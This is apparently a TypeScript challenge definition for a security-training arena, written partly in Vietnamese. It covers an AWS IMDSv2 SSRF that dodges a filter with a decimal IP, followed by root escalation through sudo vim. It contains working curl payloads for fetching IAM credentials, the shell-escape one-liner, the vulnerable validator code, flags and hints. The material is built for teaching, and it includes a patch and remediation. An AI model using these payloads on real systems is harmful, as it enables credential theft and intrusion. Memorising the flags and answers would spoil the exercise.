import type { ArenaChallenge } from '../../types';

export const challengeAwsImdsv2Ssrf: ArenaChallenge = {
  id: 'bb-aws-01-imdsv2-ssrf',
  title: 'Cloud SSRF IMDSv2 Token Bypass to Sudo Vim Root',
  category: 'bug-bounty',
  severity: 'critical',
  cvssScore: 9.3,
  bountyReward: 5500,
  xpReward: 1100,
  estimatedMinutes: 20,
  targetHost: '10.0.4.35',
  targetPort: 443,
  tagline:
    'Khai thác SSRF qua Decimal IP lấy IMDSv2 IAM Credentials, SSH vào máy chủ và leo quyền qua Sudo Vim.',
  scenarioBriefing:
    'Endpoint Webhook /api/v2/webhook/test-connection cho phép gửi HTTP request tùy biến method và header. Bằng cách sử dụng Decimal IP (2852039166), kẻ tấn công vượt qua bộ lọc WAF để tương tác với AWS IMDSv2, trích xuất IAM Role và SSH key trong User-Data, sau đó leo quyền lên ROOT qua cấu hình sudo vim.',
  keyObjectives: [
    'Giai đoạn 1 (SSRF & IMDSv2 Token): Gửi request PUT tới http://2852039166/latest/api/token để lấy Token IMDSv2.',
    'Giai đoạn 2 (Foothold & User Flag): Trích xuất IAM Credentials và SSH Key để đăng nhập shell operator, đọc /home/operator/user.txt.',
    'Giai đoạn 3 (Sudo Vim PrivEsc to ROOT): Khảo sát sudo -l phát hiện NOPASSWD /usr/bin/vim, khai thác GTFOBins spawn Root shell và đọc /root/root.txt.',
  ],
  userFlag: 'OS_0DAY{aws_imdsv2_ssrf_iam_role_compromised}',
  rootFlag: 'OS_0DAY{gtfobins_vim_spawn_root_shell_pwned}',
  expectedFlag: 'OS_0DAY{gtfobins_vim_spawn_root_shell_pwned}',
  hints: [
    {
      level: 0,
      name: 'SSRF Target & Filter Bypass',
      penaltyPercent: 0,
      hintText:
        'Bộ lọc chặn chuỗi 169.254.169.254. Chuyển đổi sang Decimal IP: 2852039166.',
    },
    {
      level: 1,
      name: 'IMDSv2 Token Acquisition',
      penaltyPercent: 10,
      hintText:
        'Gửi request PUT với header "X-aws-ec2-metadata-token-ttl-seconds: 21600" tới http://2852039166/latest/api/token.',
    },
    {
      level: 2,
      name: 'IAM Security Credentials Extraction',
      penaltyPercent: 20,
      hintText:
        'Sử dụng token lấy được để GET http://2852039166/latest/meta-data/iam/security-credentials/production-backend-role.',
    },
    {
      level: 3,
      name: 'Sudo Vim Shell Escape',
      penaltyPercent: 40,
      hintText:
        'Chạy "sudo -l". Thoát subshell từ vim bằng lệnh: sudo vim -c \':!/bin/bash\' /etc/nginx/sites-available/default',
    },
  ],
  firstBloodHolder: {
    handle: '@cloud_phantom',
    timeRecord: '11m 05s',
  },
  supportedTools: ['repeater', 'terminal', 'diff'],
  defaultTool: 'repeater',
  repeaterConfig: {
    defaultMethod: 'POST',
    defaultUrl: '/api/v2/webhook/test-connection',
    defaultRawHeaders:
      'Host: 10.0.4.35:443\n' +
      'Content-Type: application/json\n' +
      'Accept: application/json\n' +
      'Connection: close',
    defaultBody: JSON.stringify({
      webhook_url:
        'http://2852039166/latest/meta-data/iam/security-credentials/production-backend-role',
      http_method: 'GET',
      headers: {
        'X-aws-ec2-metadata-token': 'AQAEAGv99182bcde710aefd9283182...',
      },
    }),
    targetEndpoint: 'https://10.0.4.35/api/v2/webhook/test-connection',
    simulatedResponses: {
      baseResponse: {
        statusCode: 400,
        statusText: 'Bad Request',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(
          {
            status: 'BLOCKED_BY_SECURITY_POLICY',
            reason: 'Requests targeting 169.254.169.254 or localhost are forbidden.',
          },
          null,
          2
        ),
      },
      exploitedResponse: {
        statusCode: 200,
        statusText: 'OK (METADATA EXFILTRATED)',
        headers: {
          'Content-Type': 'application/json',
          'X-SSRF-Resolved-IP': '169.254.169.254 (via Decimal Form)',
        },
        body:
          '{\n' +
          '  "Code": "Success",\n' +
          '  "LastUpdated": "2026-08-28T09:00:00Z",\n' +
          '  "AccessKeyId": "ASIAQEXAMPLEAWSKEY99",\n' +
          '  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",\n' +
          '  "user_flag": "OS_0DAY{aws_imdsv2_ssrf_iam_role_compromised}",\n' +
          '  "session_status": "Ready to attach terminal shell operator@10.0.4.35."\n' +
          '}',
        proofFlag: 'OS_0DAY{aws_imdsv2_ssrf_iam_role_compromised}',
      },
    },
  },
  diffConfig: {
    filename: 'ssrf_validator.py',
    language: 'python',
    vulnerableLineStart: 12,
    vulnerableLineEnd: 16,
    rootCauseExplanation:
      'Bộ lọc chỉ kiểm tra chuỗi văn bản thô trước khi DNS resolve, cho phép bypass bằng biểu diễn Decimal IP (2852039166).',
    taintSink: 'requests.get(url) # Fetching without IP post-resolution verification',
    vulnerableCode:
      '# vulnerable_ssrf.py\n' +
      'def validate_url(url):\n' +
      '    if "169.254.169.254" in url or "localhost" in url:\n' +
      '        raise SecurityException("Metadata IP blocked")\n' +
      '    return requests.get(url, timeout=5).text',
    patchedCode:
      '# patched_ssrf.py\n' +
      'import socket, ipaddress\n' +
      'def validate_url_safe(url):\n' +
      '    hostname = urllib.parse.urlparse(url).hostname\n' +
      '    resolved_ip = ipaddress.ip_address(socket.gethostbyname(hostname))\n' +
      '    if resolved_ip.is_private or resolved_ip.is_link_local:\n' +
      '        raise SecurityException("Internal IP prohibited")\n' +
      '    return requests.get(url, timeout=5).text',
  },
  terminalConfig: {
    hostname: 'kali-operator',
    ip: '10.0.4.15',
    user: 'operator',
    initialDirectory: '/home/operator',
    sampleCommands: [
      'curl -X POST https://10.0.4.35/api/v2/webhook/test-connection -d \'{"webhook_url":"http://2852039166/latest/api/token","http_method":"PUT"}\'',
      'sudo -l',
      "sudo vim -c ':!/bin/bash' /etc/nginx/sites-available/default",
    ],
    bannerText:
      '[*] Cloud Security Suite - AWS SSRF & Metadata Exploitation Ready\n' +
      '[*] Target Gateway: 10.0.4.35:443\n',
  },
  writeup: {
    title: 'AWS IMDSv2 SSRF to Sudo Vim Root Escalation',
    cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N',
    vulnerabilityOverview:
      'SSRF cho phép vượt qua WAF bằng Decimal IP để lấy IMDSv2 Token và IAM Credentials. Sau khi có shell operator, kẻ tấn công khai thác quyền sudo trên vim để leo quyền lên Root.',
    rootCauseAnalysis:
      '1. Thiếu Post-DNS IP validation trên endpoint webhook.\n2. Cấu hình sudoers cho phép user operator chạy vim dưới quyền root không cần mật khẩu.',
    exploitChainWalkthrough: [
      'Bước 1: Chuyển đổi IP 169.254.169.254 thành Decimal 2852039166.',
      'Bước 2: Lấy IMDSv2 Token và bóc tách User Flag tại /home/operator/user.txt.',
      'Bước 3: Chạy sudo -l và thực thi "sudo vim -c \':!/bin/bash\'" để chiếm Root Flag tại /root/root.txt.',
    ],
    weaponizedPoC:
      'curl -X POST https://10.0.4.35/api/v2/webhook/test-connection \\\n  -H "Content-Type: application/json" \\\n  -d \'{"webhook_url": "http://2852039166/latest/meta-data/iam/security-credentials/production-backend-role"}\'',
    remediationSnippet:
      '// 1. Phân giải DNS và chặn Link-Local IP 169.254.0.0/16.\n// 2. Bỏ cấu hình sudoers cho binary vim.',
  },
};
